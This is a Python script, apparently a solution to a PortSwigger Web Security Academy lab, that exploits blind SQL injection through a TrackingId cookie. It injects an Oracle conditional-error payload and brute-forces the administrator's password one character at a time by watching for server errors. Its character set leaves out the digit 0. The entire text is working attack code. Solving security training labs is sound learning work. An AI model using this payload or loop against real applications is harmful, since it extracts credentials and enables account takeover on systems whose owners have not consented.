#https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
from utils import *

url="https://0ae90031036746a3812743330044006b.web-security-academy.net/filter?category=Lifestyle"
session=requests.Session()
org_response=session.get(url)
cookies=org_response.cookies
tracking_id=cookies['TrackingId']

alphanum="abcdefghijklmnopqrstuvwxyz123456789"
password=''
for idx in range(1,21):
    for letter in alphanum:
        payload=f"'||(SELECT CASE WHEN SUBSTR(password,{idx},1)='{letter}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
        forged_cookies=cookies
        forged_cookies['TrackingId']=f"{tracking_id}{payload}"
        response=session.get(url,cookies=forged_cookies)
        if 'Internal' in parse_html(response).text:
            print(f"letter {letter} at index {idx}")
            password+=letter
            break
        else:print(f"fired up {letter} {idx}")

print(password)
#aint gonna bother logging automatically if you got to this point you know what to do